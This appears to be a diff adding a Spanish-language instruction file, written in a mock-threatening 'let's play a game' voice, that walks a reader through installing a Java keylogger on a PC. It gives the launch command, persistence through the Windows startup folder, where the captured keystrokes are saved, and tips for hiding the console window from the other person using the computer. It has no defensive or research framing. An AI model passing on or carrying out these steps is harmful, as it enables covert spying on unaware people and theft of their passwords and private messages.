@@ -1,0 +1,26 @@
+Hola Alexander.
+Tu no me conoces, pero yo a ti si.
+Quiero jugar un juego.
+
+En la carpeta que estas viendo, encontraras un archivo .jar, una carpeta lib y un archivo .properties
+Ubicalas donde desees pero recuerda... recuerda donde las dejaste!.
+
+Ahora crea un archivo con extensión .bat
+En el archivo deberás programar lo siguiente...
+
+javaw -jar LA_RUTA_DONDE_ESTA_EL_ARCHIVO\KeyLoggerJava.jar Config.properties
+
+Guarda el archivo con el nombre que desees, y no pierdas de vista el archivo.
+
+Ahora presiona Ctrl + R, en la ventana de ejecutar escribe shell:startup
+NO TE ASUSTES, eso abrira una ventana en una carpeta... Pega el archivo .bat ahi.
+
+Ahora deberas reiniciar el PC, una vez inicies nuevamente el pc, ve a la carpeta donde esta el KeyLogger
+Ahi deberas ver un archivo Logger.log
+Abrelo... ahi queda guardado todo.
+
+Buena suerte.
+
+Es muy probable que cuando arranque tu pc, salga una ventana negra... yo lo que hice fue iniciar mi pc
+y cerrar esa ventana, nunca mas apague el pc mientras ejecutaba mi acto hahaha.
+Solo suspendelo, cosa de que el que lo use solo tenga que iniciar sesion y no vea esa ventanita negra.
